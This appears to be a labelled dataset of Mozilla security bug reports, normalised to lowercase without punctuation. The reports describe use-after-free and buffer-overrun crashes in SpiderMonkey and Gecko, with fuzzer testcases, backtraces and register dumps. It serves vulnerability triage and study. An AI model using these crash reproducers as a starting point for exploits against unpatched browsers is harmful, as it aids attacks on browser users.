crash objecttype or crash caninlinesetproptypecheck with use-after-free the following testcase crashes on mozilla-central revision 6020a4cb41a7 build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal target=i686-pc-linux-gnu disable-tests disable-debug run with fuzzing-safe no-threads disable-oom-functions baseline-eager ion-eager setjitcompileroption ion.warmup.trigger 20 native function k d k.initialize j function n l o n.prototype l o d.implement function m for n in m j this n m n native initialize function function mixin e for d 1 var b arguments d for c in b e string e c unlink function type a return typeof a function unlink if type c object b return b function.implement extend a for var b in a this b a b return this function class b a function object.reset this extend this a.implement b return a object.reset function a c if c null for e in a object.reset a e switch type case object d function d.prototype a c var b new d a c b new native initialize class class.implement implement a d if type a object for e in a this.implement e a e f class.mutators a if f f.call this d c this.prototype switch type d case object var b c a if type b object mixin b d c a unlink class.mutators extends a this.prototype new a new class extends new class options options postvar backtrace program received signal sigsegv segmentation fault objecttype obj at js/src/vm/typeinference-inl.h:146 0 objecttype obj at js/src/vm/typeinference-inl.h:146 1 getvaluetype val at js/src/vm/typeinference-inl.h:171 2 caninlinesetproptypecheck obj=obj entry id checktypeset=checktypeset entry val at js/src/jit/ioncaches.cpp:3179 3 in ispropertysetinlineable checktypeset needstypebarrier=true pshape id obj val at js/src/jit/ioncaches.cpp:3226 4 canattachnativesetprop checktypeset shape holder needstypebarrier=true id obj cx val at js/src/jit/ioncaches.cpp:3308 5 js jit setpropertyic tryattachnative this=this entry cx=cx entry outerscript=outerscript entry ion=ion entry obj=obj entry id=id entry emitted=emitted entry trynativeaddslot=trynativeaddslot entry at js/src/jit/ioncaches.cpp:3526 6 in js jit setpropertyic tryattachstub this=this entry cx=cx entry outerscript=outerscript entry ion=ion entry obj=obj entry idval=idval entry value=value entry id=id entry emitted=emitted entry trynativeaddslot=trynativeaddslot entry at js/src/jit/ioncaches.cpp:3594 7 in js jit setpropertyic update cx outerscript cacheindex=0 obj idval value at js/src/jit/ioncaches.cpp:3691 8 in backtrace stopped previous frame inner to this frame corrupt stack eax 724249387 ebx 155698140 ecx 162228768 edx 162878512 esi 162878480 edi 162217200 ebp 4132737024 esp 4294945056 eip caninlinesetproptypecheck jsobject jsid bool 589 caninlinesetproptypecheck jsobject jsid bool 589 testb eax caninlinesetproptypecheck jsobject jsid bool 593 mov eax esp the testcase crashes with pattern indicating a use-after-free marking sec-critical until shown otherwise	11
assertion failure tag sctag_transfer_map_pending_entry at js/src/vm/structuredclone.cpp:429 with oom the following testcase crashes on mozilla-central revision 6764bc656c1d build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal target=i686-pc-linux-gnu disable-tests enable-debug run with fuzzing-safe thread-count=2 ion-offthread-compile=off ion-extra-checks switch 0 default oomtest serialize 0 schedulegc backtrace program received signal sigsegv segmentation fault in discardtransferables buffer optimized out nbytes optimized out cb cbclosure at js/src/vm/structuredclone.cpp:429 0 in discardtransferables buffer optimized out nbytes optimized out cb cbclosure at js/src/vm/structuredclone.cpp:429 1 in jsstructuredclonewriter jsstructuredclonewriter this in_chrg optimized out at js/src/vm/structuredclone.cpp:749 2 in writestructuredclone cx=cx entry v=v entry bufp=bufp entry nbytesp=nbytesp entry cb=cb entry cbclosure=cbclosure entry transferable at js/src/vm/structuredclone.cpp:390 3 in js_writestructuredclone cx=cx entry value=value entry bufp=bufp entry nbytesp=nbytesp entry optionalcallbacks=optionalcallbacks entry closure=closure entry transferable=transferable entry at js/src/vm/structuredclone.cpp:2137 4 in jsautostructuredclonebuffer write this=this entry cx=cx entry value transferable optionalcallbacks=optionalcallbacks entry closure=closure entry at js/src/vm/structuredclone.cpp:2325 5 in serialize cx argc=2 vp at js/src/builtin/testingfunctions.cpp:2015 6 in js calljsnative cx native serialize jscontext unsigned int js value args at js/src/jscntxtinlines.h:235 7 in js invoke cx args construct=construct entry=js no_construct at js/src/vm/interpreter.cpp:478 8 in interpret cx=cx entry state at js/src/vm/interpreter.cpp:2802 9 in js runscript cx=cx entry state at js/src/vm/interpreter.cpp:425 10 in js invoke cx args construct=construct entry=js no_construct at js/src/vm/interpreter.cpp:496 11 in js invoke cx=cx entry thisv fval argc=argc entry=0 argv=argv entry rval=rval entry at js/src/vm/interpreter.cpp:530 12 in js_callfunction cx=cx entry obj fun=fun entry args rval=rval entry at js/src/jsapi.cpp:2857 13 in oomtest cx argc=1 vp at js/src/builtin/testingfunctions.cpp:1218 14 in js calljsnative cx native oomtest jscontext unsigned int js value args at js/src/jscntxtinlines.h:235 26 main argc=6 argv envp at js/src/shell/js.cpp:6985 eax 0 ebx 159654964 ecx 136071028 edx 0 esi 1 edi 140499152 ebp 4294948008 esp 4294947920 eip discardtransferables uint64_t size_t jsstructuredclonecallbacks const void 320 discardtransferables uint64_t size_t jsstructuredclonecallbacks const void 320 movl discardtransferables uint64_t size_t jsstructuredclonecallbacks const void 330 call abort	11
eventlistenermanager handleeventinternal has a raw pointer to a docshell which can be destructed via event-handling before we finish using it i filed bug 1243536 for an innocuous code-cleanup opportunity but smaug noticed there was actually a security bug that my patch fixed so i m re-filing as a security bug the code from a security perspective is 1162 nsdocshell docshell 1166 if mismainthreadelm 1167 listener mlistenertype listener enativelistener 1168 nscomptr nsidocshell docshellcomptr getdocshellfortarget 1169 if docshellcomptr 1170 docshell static_cast nsdocshell docshellcomptr.get 1180 1181 1182 1183 1184 if ns_failed handleeventsubtype listener adomevent acurrenttarget 1185 aevent mflags.mexceptionhasbeenrisen true 1186 1187 1188 if needsendeventmarker 1189 timelines addmarkerfordocshell 1190 docshell domevent markertracingtype end 1191 the problem is that the event-handling code at line 1184 could run arbitrary js i think and destroy our document docshell which means our final addmarkerfordocshell call at line 1189 could be be passing in a pointer to deleted memory docshell the fix is easy just hold onto docshell in a refcounted pointer	11
assertion failure isidle oldstate at xpcom/glue/pldhashtable.h:140 str 1 load attached testcase coming up in a debug build the testcase has an iframe that has an event handler which removes the iframe from its parent document actual results assertion failure isidle oldstate at scratch/work/builds/mozilla-central/mozilla-central-11-11-01.13-56/mozilla/xpcom/glue/pldhashtable.h:140 the backtrace attached shows this is happening in eventlistener handleevent calling into js unsurprisingly marking this as security-sensitive because 1 even though we re not crashing this seems like we might be on the edge of using freed memory 2 i hit this when trying to come up with a testcase for bug 1243555 and this might be close to something usable as an attack-vector for that bug so we probably should n't open this up until bug 1243555 is no longer a threat	11
crash at nsidnservice idna2008tounicode nsudpsocket setmulticastloopback js frontend parser js frontend fullparsehandler functiondef ns_unescapeurl arena_run_dalloc found via bughunter and reproduced on a win 7 trunk debug build based on m-c tip from today steps to reproduce load crashes both opt and debug builds windbg reports status_stack_buffer_overrun encountered signature seems to be nsidnservice idna2008tounicode nsudpsocket setmulticastloopback js frontend parser js frontend fullparsehandler functiondef ns_unescapeurl arena_run_dalloc	11
uaf in cameras shutdown on channel errors c9 this comment is wrong if shutdown is called from the destructor before the cameras/pbackground thread has been shut down 518 this is not an owning reference see 106 this case occurs if the protocol handlers get shut down due to an ipc error	11
crash in anonymous namespace windowsgamepadservice scanfordevices this bug was filed from the socorro interface and is report bp-fc3e7119-b8f8-4b21-afe0-2d6f32160216 occurred when running 32-bit firefox nightly on emunittest 0.5 suite	11